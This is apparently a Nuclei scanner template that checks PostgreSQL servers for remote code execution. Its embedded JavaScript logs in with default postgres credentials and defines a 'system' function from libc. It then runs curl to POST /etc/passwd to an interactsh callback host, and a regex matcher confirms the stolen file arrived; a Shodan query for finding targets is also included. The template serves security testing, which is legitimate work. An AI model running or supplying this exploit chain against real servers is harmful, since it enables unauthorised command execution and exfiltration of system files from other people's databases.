id: pgsql-extensions-rce
info:
  author: pussycat0x
  description: 'PostgreSQL allows for extensions, which are modules providing extra
    functionality like functions, operators, or types. Starting from version 8.1,
    these extensions must be compiled with a special header for compatibility with
    PostgreSQL''s extension mechanism.

    '
  metadata:
    shodan-query: product:"PostgreSQL"
    verified: true
  name: PostgreSQL 8.1  Extensions - Remote Code Execution
  reference:
  - https://www.dionach.com/postgresql-9-x-remote-command-execution/
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-libcso6
  - https://hacktricks.boitatech.com.br/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions
  severity: high
  tags: postgresql,js,network,rce
javascript:
- args:
    Db: '{{database}}'
    Host: '{{Host}}'
    Pass: '{{password}}'
    Port: 5432
    User: '{{usernames}}'
    shurl: http://{{interactsh-url}}
  attack: clusterbomb
  code: "const postgres = require('nuclei/postgres');\nconst client = new postgres.PGClient;\n\
    const collab = shurl\nconst qry = [\"CREATE OR REPLACE FUNCTION system(cstring)\
    \ RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;\"\
    , \"SELECT system('curl -X POST -d @/etc/passwd \"+ collab +\"');\"];\nfor (const\
    \ x of qry){\n  connected =  client.ExecuteQuery(Host, Port, User, Pass, Db, x);\n\
    \  Export(connected);\n}\n"
  matchers:
  - part: interactsh_request
    regex:
    - 'root:[x*]:0:0:'
    type: regex
  payloads:
    database:
    - postgres
    password:
    - postgres
    usernames:
    - postgres
